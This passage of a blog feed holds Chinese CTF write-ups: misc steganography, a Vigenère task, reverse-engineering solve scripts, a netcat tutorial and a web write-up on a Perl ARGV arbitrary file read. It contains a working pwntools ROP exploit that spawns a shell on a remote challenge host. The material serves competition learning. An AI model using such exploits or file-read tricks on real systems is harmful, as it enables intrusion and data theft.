m67vvJwpCp&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCq&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCl&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAq&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCl&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCi&#x3D;&#x3D;KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK                     KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK                   KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK             KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIo4pWv4oC14pah4oCyKeKVr+eCuOW8ue+8geKAouKAouKAoijila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIKZmxhZ+iiq+aIkeeCuOayoeS6huWTiOWTiOWTiC&#x3D;&#x3D;</code></pre><p>解密后：</p><pre class="language-none"><code class="language-none">(｡･∀･)ﾉﾞ嗨Hi~ (＠_＠;)(＠_＠;)(＠_＠;)(+_+)?(。&gt;︿&lt;)_θ(。&gt;︿&lt;)_θo(*￣▽￣*)ブ゜＜（＾－＾）＞(╯▽╰ )好香~~ヽ(✿ﾟ▽ﾟ)ノ(＠＾０＾)(^^ゞΨ(￣∀￣)Ψ*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。~\(≧▽≦)&#x2F;~o(^▽^)o(¬‿¬)(*≧︶≦))(￣▽￣* )ゞ┳━┳(╯‵□′)╯︵┻━┻┳━┳ ノ( ゜-゜ノ)ಠ_ಠಠ_ಠ(╯‵□′)╯炸弹！•••*～●(¬_¬ )(ノへ￣、)o(￣┰￣*)ゞ╰(艹皿艹 )（︶^︶）(* ￣︿￣)(￣ε(#￣)(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(¬_¬&quot;)(￣﹏￣；)(╯°□°）╯︵ ┻━┻ヽ(゜▽゜　)－C&lt;(&#x2F;;◇;)&#x2F;~(ヘ･_･)ヘ┳━┳ಠ_ಠ(╯‵□′)╯炸弹！•••*～●(¬_¬ )(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃⊙﹏⊙∥ヽ(*。&gt;Д&lt;)o゜&#x2F;(ㄒoㄒ)&#x2F;~~(#_&lt;-)（＞人＜；）(ノへ￣、)o(￣┰￣*)ゞ╰(艹皿艹 )（︶^︶）(* ￣︿￣)(￣ε(#￣)(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••flag被我炸没了哈哈哈</code></pre><p>空格和base64加密的颜文字</p><p>stegsnow解出现乱码</p><p>拿颜文字的base64跑base64隐写，得到秘钥<code>lorrie</code></p><p>连到自己的服务器上nc保存文件</p><img src="/article/2020hxb-Writeup-cOMING/24f08c5af60b185a313ee1463c9a4852.png" class=""><img src="/article/2020hxb-Writeup-cOMING/113c837089faeae4e4cbf169b26103f2.png" class=""><img src="/article/2020hxb-Writeup-cOMING/a6cd84af9e66703249e6d040b8378d79.png" class=""><p><code>→_→</code>替换为<code>-</code>,<code>←_←</code>替换为<code>.</code>,去网站上解码</p><img src="/article/2020hxb-Writeup-cOMING/4be4b33a5bdc0c72d555bcf347fc81dd.png" class=""><img src="/article/2020hxb-Writeup-cOMING/f9ede18047cccbfc556a9c345a0beac0.png" class=""><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="古典美"><a href="#古典美" class="headerlink" title="古典美++"></a>古典美++</h3><p>利用网站工具得维吉尼亚密码密钥</p><img src="/article/2020hxb-Writeup-cOMING/7623653b8d5fa7474f7a021105bcc064.png" class=""><p>为<code>orderby</code> 生成MD5</p><img src="/article/2020hxb-Writeup-cOMING/5ac8fcc0d5536abdee804959d8a3c242.png" class=""><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h3><p>exp:</p><pre class="language-none"><code class="language-none">from pwn import *from LibcSearcher import *context.log_level &#x3D; &#39;debug&#39;context.terminal&#x3D;[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]p &#x3D; remote(&#39;47.111.96.55&#39;,54606)elf &#x3D; ELF(&#39;.&#x2F;pwn_printf&#39;)read_plt &#x3D; elf.symbols[&#39;read&#39;]read_got &#x3D; elf.got[&#39;read&#39;]puts_plt &#x3D; elf.symbols[&#39;puts&#39;]puts_got &#x3D; elf.got[&#39;puts&#39;]pop_rdi &#x3D; 0x401213v_addr &#x3D; 0x4007C6scanf &#x3D; 0x4006A0pop_rsi_ret &#x3D; 0x401211p.recvuntil(&quot;You will find this game very interesting&quot;)for i in range(16):    p.sendline(&quot;32&quot;)payload1 &#x3D; b&#39;a&#39;*0x8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(0x40) + p64(v_addr)p.sendline(payload1)p.recvline()rrr &#x3D; p.recv(6)puts_addr &#x3D; u64(rrr.ljust(8,b&#39;\x00&#39;))print (hex(puts_addr))wri &#x3D; 0x06030A0payload2 &#x3D; b&#39;a&#39;*0x8 + p64(pop_rdi) + p64(0x0401D99 ) +p64(pop_rsi_ret) +p64(wri)+p64(0)+ p64(scanf) + p64(pop_rdi) + p64(8*4 )+ p64(v_addr+1)p.recv()n1 &#x3D; int(b&#39;&#x2F;bin&#39;[::-1].hex(),16)n2 &#x3D; int(b&#39;&#x2F;sh\x00&#39;[::-1].hex(),16)p.sendline(payload2)print(&quot;n1:&quot; + str(n1))sleep(0.3)p.sendline(str(n1))wri &#x3D; 0x06030A0+4sleep(0.5)payload2 &#x3D; b&#39;a&#39; * 0x8 + p64(pop_rdi) + p64(0x0401D99) + p64(pop_rsi_ret) + p64(wri) + p64(0) + p64(scanf) + p64(v_addr)p.send(payload2)p.sendline(str(n2))payload3 &#x3D; b&#39;a&#39; * 0x8 + p64(pop_rdi) + p64(0x06030A0) + p64(puts_addr-0x2a300)sleep(0.5)p.sendline(payload3)p.interactive()</code></pre><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>爆破，逐个击破。。。</p><p>easy_c++</p><p>IDA分析 一个信息</p><img src="/article/2020hxb-Writeup-cOMING/61a2caae7f31cbfc365432119425d6fd.png" class=""><img src="/article/2020hxb-Writeup-cOMING/565ff985b4b771d98409ec3233eb8309.png" class=""><p>长度32</p><img src="/article/2020hxb-Writeup-cOMING/17aa83fa3a88db01f27c8fb3d41c5e5f.png" class=""><p>exp：</p><pre class="language-none"><code class="language-none">public class Test &#123;    public static void main(String[] args) &#123;        String a &#x3D; &quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*&#123;*+*$|,&quot;;        char v11;        int v13;        for (int i &#x3D;0; i&lt;32; i++)        &#123;            v11 &#x3D; a.charAt(i);            v13 &#x3D; i ^ (int)v11;            System.out.print((char)v13);        &#125;    &#125;&#125;</code></pre><h3 id="ReMe"><a href="#ReMe" class="headerlink" title="ReMe"></a>ReMe</h3><p>反编译py</p><pre class="language-none"><code class="language-none">python3 pyinstxtractor.py ReMe.exe</code></pre><img src="/article/2020hxb-Writeup-cOMING/1393ddb113bda2babe004c8a7bd44c13.png" class=""><p>010打开</p><img src="/article/2020hxb-Writeup-cOMING/38a8bb796f44edf49bb8ec9ae28a850c.png" class=""><p>置换之后：</p><img src="/article/2020hxb-Writeup-cOMING/0b91b5d7322cfcb630981982098feea8.png" class=""><p>改后缀：ReMe.pyc</p><pre class="language-none"><code class="language-none">uncompyle6 ReMe.pycλ uncompyle6 ReMe.pyc# uncompyle6 version 3.7.4# Python bytecode 3.7 (3394)# Decompiled from: Python 3.8.5 (tags&#x2F;v3.8.5:580fbb0, Jul 20 2020, 15:57:54) [MSC v.1924 64 bit (AMD64)]# Embedded file name: ReMe.py# Compiled at: 1995-09-28 00:18:56# Size of source mod 2**32: 272 bytesimport sys, hashlibcheck &#x3D; [ &#39;e5438e78ec1de10a2693f9cffb930d23&#39;, &#39;08e8e8855af8ea652df54845d21b9d67&#39;, &#39;a905095f0d801abd5865d649a646b397&#39;, &#39;bac8510b0902185146c838cdf8ead8e0&#39;, &#39;f26f009a6dc171e0ca7a4a770fecd326&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;4cb467175ab6763a9867b9ed694a2780&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;fd311e9877c3db59027597352999e91f&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;7fb523b42413495cc4e610456d1f1c84&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;bc52c927138231e29e0b05419e741902&#39;, &#39;515b7eceeb8f22b53575afec4123e878&#39;, &#39;451660d67c64da6de6fadc66079e1d8a&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;fe86104ce1853cb140b7ec0412d93837&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;c2bab7ea31577b955e2c2cac680fb2f4&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;f077b3a47c09b44d7077877a5aff3699&#39;, &#39;620741f57e7fafe43216d6aa51666f1d&#39;, &#39;9e3b206e50925792c3234036de6a25ab&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;874992ac91866ce1430687aa9f7121fc&#39;]def func(num):    result &#x3D; []    while num !&#x3D; 1:        num &#x3D; num * 3 + 1 if num % 2 else num &#x2F;&#x2F; 2        result.append(num)    return resultif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    print(&#39;Your input is not the FLAG!&#39;)    inp &#x3D; input()    if len(inp) !&#x3D; 27:        print(&#39;length error!&#39;)        sys.exit(-1)    for i, ch in enumerate(inp):        ret_list &#x3D; func(ord(ch))        s &#x3D; &#39;&#39;        for idx in range(len(ret_list)):            s +&#x3D; str(ret_list[idx])            s +&#x3D; str(ret_list[(len(ret_list) - idx - 1)])        md5 &#x3D; hashlib.md5()        md5.update(s.encode(&#39;utf-8&#39;))        if md5.hexdigest() !&#x3D; check[i]:            sys.exit(i)    md5 &#x3D; hashlib.md5()    md5.update(inp.encode(&#39;utf-8&#39;))    print(&#39;You win!&#39;)    print(&#39;flag&#123;&#39; + md5.hexdigest() + &#39;&#125;&#39;)# okay decompiling ReMe.pyc</code></pre><p>exp:</p><pre class="language-none"><code class="language-none">import hashlibcheck &#x3D; [ &#39;e5438e78ec1de10a2693f9cffb930d23&#39;, &#39;08e8e8855af8ea652df54845d21b9d67&#39;, &#39;a905095f0d801abd5865d649a646b397&#39;, &#39;bac8510b0902185146c838cdf8ead8e0&#39;, &#39;f26f009a6dc171e0ca7a4a770fecd326&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;4cb467175ab6763a9867b9ed694a2780&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;fd311e9877c3db59027597352999e91f&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;7fb523b42413495cc4e610456d1f1c84&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;bc52c927138231e29e0b05419e741902&#39;, &#39;515b7eceeb8f22b53575afec4123e878&#39;, &#39;451660d67c64da6de6fadc66079e1d8a&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;fe86104ce1853cb140b7ec0412d93837&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;c2bab7ea31577b955e2c2cac680fb2f4&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;f077b3a47c09b44d7077877a5aff3699&#39;, &#39;620741f57e7fafe43216d6aa51666f1d&#39;, &#39;9e3b206e50925792c3234036de6a25ab&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;874992ac91866ce1430687aa9f7121fc&#39;]def func(number):    ret &#x3D; []    while number !&#x3D; 1:        number &#x3D; number * 3 + 1 if number % 2 else number &#x2F;&#x2F; 2        ret.append(number)    return retfor i in range(1,128):    a &#x3D; func(i)    ans &#x3D; &quot;&quot;    for j in range(len(a)):        ans +&#x3D; str(a[j])        ans +&#x3D; str(a[(len(a) - j - 1)])    md5 &#x3D; hashlib.md5()    md5.update(ans.encode(&#39;utf-8&#39;))    b &#x3D; md5.hexdigest()    for j in range(27):        if b &#x3D;&#x3D; check[j]:            print chr(i),j</code></pre><p>跑出 flag{My_M@th_3X+1_R3v_Te5t} 再跑md5</p><img src="/article/2020hxb-Writeup-cOMING/ac2500682b8e1112e9a89ce1b1f97465.png" class="">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存取证 </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> 伪加密 </tag>
            
            <tag> 明文攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netcat 网络测试工具</title>
      <link href="article/Netcat/"/>
      <url>article/Netcat/</url>
      
        <content type="html"><![CDATA[<h2 id="这里是中国科技大学-taoky-写的一篇文章-nc是什么"><a href="#这里是中国科技大学-taoky-写的一篇文章-nc是什么" class="headerlink" title="这里是中国科技大学@taoky 写的一篇文章: nc是什么?"></a><strong>这里是中国科技大学@taoky 写的一篇文章: nc是什么?</strong></h2><p>请仔细阅读，一般二进制bin方向可能用到nc的地方会很多。</p><hr><p>nc/ncat 是 netcat 的缩写，它可以读写 TCP 与 UDP 端口——或许你看不懂这句话，这没有关系。简单地说，它可以在字符界面下，让你和服务器沟通交流。<br>一般来说，有很多题目都会要求你使用 nc 连接到他们的服务器，并且进行交互，获得 flag</p><h2 id="如何安装-nc？"><a href="#如何安装-nc？" class="headerlink" title="如何安装 nc？"></a>如何安装 nc？</h2><p><code>nc</code> 命令在 macOS 中是自带的，在 Linux 中一般自带，或是可以使用相应的软件包管理器安装（如在 Debian/Ubuntu 中这个包名叫 netcat）。</p><p>当然，如果你在看这篇手册，你的操作系统很有可能是 Windows。它不自带 <code>nc</code>，尽管可以用 WSL 或者虚拟机的方式解决，但是如果你觉得这样太麻烦了，也有另外一些方法。</p><h3 id="使用静态链接的-ncat-程序"><a href="#使用静态链接的-ncat-程序" class="headerlink" title="使用静态链接的 ncat 程序"></a>使用静态链接的 ncat 程序</h3><p>前往 <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">此处</a> (github链接)下载此程序。我们也在这里提供了一份。下载下来即可。</p><p><a href="http://err0r.top/flag/sourses/ncat.zip">ncat.zip</a></p><p><em>注：nc/ncat 事实上是两个不同的程序，但在我们接下来的使用上，基本没有区别。ncat 是由 Nmap 项目开发的“重置版的 Netcat”。</em></p><h4 id="Q-我的杀毒软件报毒怎么办"><a href="#Q-我的杀毒软件报毒怎么办" class="headerlink" title="Q:我的杀毒软件报毒怎么办"></a>Q:我的杀毒软件报毒怎么办</h4><p>如果你不相信此来源，也可以下载 nmap（一个网络探测、扫描工具），它会附带一个 ncat。</p><h2 id="如何使用-nc"><a href="#如何使用-nc" class="headerlink" title="如何使用 nc?"></a>如何使用 nc?</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>直接双击，你会看到一个窗口一扫而过——这是正常现象。你需要使用「命令提示符」或者「PowerShell」来访问这个程序。</p><p>Windows 10 中，你可以使用资源管理器 -&gt; 文件来在你存放 nc 的目录中打开命令提示符或 PowerShell。</p><p>900</p><h6 id="在-Windows-资源管理器中打开命令提示符或-PowerShell"><a href="#在-Windows-资源管理器中打开命令提示符或-PowerShell" class="headerlink" title="在 Windows 资源管理器中打开命令提示符或 PowerShell"></a>在 Windows 资源管理器中打开命令提示符或 PowerShell</h6><p>可以直接在<code>ncat.exe</code>所在目录，按住<code>Shift+鼠标右键</code>点击<code>在此处打开Powershell窗口</code>输入<code>ncat</code></p><p>或者，你也可以在开始菜单 -&gt; Windows 系统中打开命令提示符，或者在开始菜单 -&gt; Windows PowerShell 中打开 PowerShell，也可以按住<code>win标+R</code>弹出<code>运行</code>窗口输入<code>cmd</code>，然后使用 cd 命令转移到对应的目录：输入 cd 文件夹名 可以让你转移到对应的文件夹，输入 cd .. 可以让你转移到上面一层目录。使用 dir 命令，可以显示当前目录下所有文件。同时，使用 Tab 键可以帮助你补全名称。</p><p>当跳转到你存放 nc 的文件夹后：</p><ul><li>如果你使用的是 PowerShell（蓝色背景），输入 ./ncat（根据 nc 对应的名称不同而不同）。</li><li>如果你使用的是命令提示符（黑色背景），输入 ncat（根据 nc 对应的名称不同而不同）。</li></ul><p>当显示以下内容时，说明你成功运行了它。</p><p>1450</p><h6 id="成功运行-ncat"><a href="#成功运行-ncat" class="headerlink" title="成功运行 ncat"></a>成功运行 ncat</h6><h3 id="Linux-amp-macOS"><a href="#Linux-amp-macOS" class="headerlink" title="Linux &amp; macOS"></a>Linux &amp; macOS</h3><p>打开「终端」，输入 <code>nc</code>。</p><pre class="language-none"><code class="language-none">$ ncusage: nc [-46AacCDdEFhklMnOortUuvz] [-K tc] [-b boundif] [-i interval] [-p source_port] [--apple-delegate-pid pid] [--apple-delegate-uuid uuid]  [-s source_ip_address] [-w timeout] [-X proxy_version]  [-x proxy_address[:port]] [hostname] [port[s]]</code></pre><p>出现了类似上面的输出，说明运行成功了。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>在我们使用浏览器上网的时候，我们和服务器使用了 HTTP 协议进行连接。关于 HTTP 协议的更多细节，你需要自己上网搜索。一般来说，默认是 80 端口。</p><p>我们可以使用 nc，尝试一次与网页服务器的连接，以百度为例。</p><p>输入 <code>nc www.baidu.com 80</code>（或者 <code>ncat www.baidu.com 80</code>，或者 <code>./ncat www.baidu.com 80</code>，请根据以上的介绍自行修改），程序会等待你的输入。</p><p>输入 GET / HTTP/1.0。这表示，我们使用 HTTP/1.0 这个协议版本，用 GET 的方式请求根 /。输入<strong>两下</strong>回车，代表我们的 HTTP 请求完成。如果你的网络畅通，百度的网页服务器会立刻返回大量信息，可以自行搜索，了解它们的含义。现在，你成功（在不使用浏览器的情况下）完成了一次与百度网站的连接！<br>2366</p><h6 id="内容可能不同，返回类似即表示成功"><a href="#内容可能不同，返回类似即表示成功" class="headerlink" title="内容可能不同，返回类似即表示成功"></a>内容可能不同，返回类似即表示成功</h6><p>如果你成功了，那么你可以开始愉快地完成我们的题目了！</p><hr><p>end</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 菜鸡教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> netcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuoj WEB Write-up</title>
      <link href="article/Buuoj-WEB-Write-up/"/>
      <url>article/Buuoj-WEB-Write-up/</url>
      
        <content type="html"><![CDATA[<p>by:gyy</p><p>刷题，buuoj记录</p><a id="more"></a><hr><h2 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129165730787.png" class="" title="image-20201129165730787"><p>咱也不懂perl…</p><p>发现了文件上传的地方</p><img src="/article/Buuoj-WEB-Write-up/image-20201129165825648.png" class="" title="image-20201129165825648"><p>发现会把上传的文件直接显示在网页上</p><p>查了下原理</p><h5 id="perlparam-任意文件读取"><a href="#perlparam-任意文件读取" class="headerlink" title="perlparam()任意文件读取"></a>perlparam()任意文件读取</h5><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cgi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    my <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$cgi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token variable">$file</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">print</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$_</span></span>"</span><span class="token punctuation">;</span>        <span class="token keyword">print</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p> 如上代码将上传的文件原样输出到网页 </p><p>知识点： param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。 </p><p>ARGV——命令行参数</p><p>于是抓包</p><img src="/article/Buuoj-WEB-Write-up/image-20201129170225902.png" class="" title="image-20201129170225902"><p>修改为：</p><img src="/article/Buuoj-WEB-Write-up/image-20201129170548925.png" class="" title="image-20201129170548925"><hr><h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129170732360.png" class="" title="image-20201129170732360"><p>source code</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response<span class="token keyword">import</span> urllibapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span>url_prefix <span class="token operator">=</span> <span class="token string">'/d5afe1f66147e857'</span><span class="token keyword">def</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span><span class="token keyword">def</span> <span class="token function">trigger_event</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">+=</span> event    <span class="token keyword">else</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_mid_str</span><span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> postfix<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> postfix <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span><span class="token punctuation">:</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>postfix<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span 